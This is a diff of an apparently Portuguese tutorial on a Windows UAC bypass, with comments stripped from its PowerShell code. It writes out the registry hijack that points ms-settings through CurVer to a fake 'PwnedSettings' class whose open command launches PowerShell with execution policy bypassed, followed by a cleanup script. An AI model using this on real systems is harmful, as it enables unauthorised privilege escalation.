@@ -54,21 +54,21 @@ $Candidates | Format-Table -AutoSize
 - Então precisamos executar:
 
 ```powershell
-# Cria a chave CurVer para o protocolo ms-settings 
+
 $curVerPath = "HKCU:\Software\Classes\ms-settings\CurVer" 
 
 New-Item -Path $curVerPath -Force 
 
-# Aponta para um nome de classe arbitrário (ex: 'PwnedSettings') 
+
 Set-ItemProperty -Path $curVerPath -Name "(Default)" -Value "PwnedSettings"
 
 $payloadPath = "HKCU:\Software\Classes\PwnedSettings\shell\open\command"
 New-Item -Path $payloadPath -Force
 
-# Define seu payload (neste caso, seu PowerShell com privilégio alto)
+
 Set-ItemProperty -Path $payloadPath -Name "(Default)" -Value "powershell.exe -ExecutionPolicy Bypass -NoProfile"
 
-# Adiciona o DelegateExecute para garantir que o ShellExecute não ignore a chave
+
 New-ItemProperty -Path $payloadPath -Name "DelegateExecute" -Value "" -PropertyType String
 
 ```
@@ -78,7 +78,7 @@ New-ItemProperty -Path $payloadPath -Name "DelegateExecute" -Value "" -PropertyT
 - Script de remoção do registo
 
 ```powershell
-# 1. Remove o redirecionamento CurVer 
+
 $curVerPath = "HKCU:\Software\Classes\ms-settings\CurVer" 
 
 if (Test-Path $curVerPath) { 
@@ -86,7 +86,7 @@ if (Test-Path $curVerPath) {
   Write-Host "[+] Redirecionamento CurVer removido." -ForegroundColor Green 
 }
 
- # 2. Remove a classe de payload personalizada 
+
 $fakeClassPath = "HKCU:\Software\Classes\PwnedSettings" 
 
 if (Test-Path $fakeClassPath) { 
